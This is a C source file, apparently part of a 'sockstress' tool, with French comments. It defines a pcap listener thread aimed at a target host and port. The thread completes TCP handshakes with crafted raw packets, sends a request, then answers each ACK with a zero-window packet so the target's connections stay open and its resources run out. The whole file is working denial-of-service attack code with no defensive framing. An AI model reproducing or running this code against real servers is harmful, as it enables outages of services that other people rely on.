#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

#include <dnet.h>
#include <pcap.h>

#include <netinet/ip.h>
#include <netinet/tcp.h>

#include <pthread.h>

#include "sockstress.h"
#include "tcpcreate.h"

void *thread_listen(void *arg)
{
  pcap_t *pcapDescr;
  char *device;
  struct bpf_program filter;
  char stringfilter[256];
  struct listendata *Data;

  Data = (struct listendata *) arg;

  /* Get the name of the first device suitable for capture */
  device = pcap_lookupdev(NULL);
  printf("Using device %s\n", device);

  /* Open device */
  pcapDescr = pcap_open_live(device, 96, 1, 60, NULL);

  /* Set the filter */
  sprintf(stringfilter, "src host %s and src port %hu", Data->stringdestination, Data->port);
  printf("Filtre utilise: %s\n",stringfilter);
  pcap_compile(pcapDescr, &filter, stringfilter,1,0);

  pcap_setfilter(pcapDescr, &filter);

  while (1)
    {
      struct pcap_pkthdr pkthdr;
      const unsigned char *packet;

      struct ip_hdr *iphdr;
      struct tcp_hdr *tcphdr;

      packet = pcap_next(pcapDescr, &pkthdr);

      iphdr = (struct ip_hdr *) (packet+14);
      tcphdr = (struct tcp_hdr *) (packet+14+20);

      //printf("IP SRC: %lx -", (unsigned long int) iphdr->ip_src);
      //printf("IP DST: %lx -", (unsigned long int) iphdr->ip_dst);
      //printf("\n");

      // On a recu un SYN ACK, on finit la connexion, puis on envoie la requete
      if ((tcphdr->th_flags & TH_SYN) && (tcphdr->th_flags & TH_ACK))
	{
	  printf("SYN ACK recu\n");
	  send_tcp_ack(iphdr->ip_src, iphdr->ip_id,
		       ntohs(tcphdr->th_sport), ntohs(tcphdr->th_dport),
		       ntohl(tcphdr->th_ack), ntohl(tcphdr->th_seq)+1);

	  send_request(iphdr->ip_src, iphdr->ip_id,
		       ntohs(tcphdr->th_sport), ntohs(tcphdr->th_dport),
		       ntohl(tcphdr->th_ack), ntohl(tcphdr->th_seq)+1, Data->request);
	}

      // On a recu juste un ACK, on envoie fenetre a 0
      else if ((tcphdr->th_flags & TH_ACK))
	{
	  //sleep(1);
	  printf("ACK recu\n");
	  send_tcp_win_zero(iphdr->ip_src, iphdr->ip_id,
			    ntohs(tcphdr->th_sport), ntohs(tcphdr->th_dport),
			    ntohl(tcphdr->th_ack), ntohl(tcphdr->th_seq)+1);
	}

    }

  pthread_exit(EXIT_SUCCESS);
}
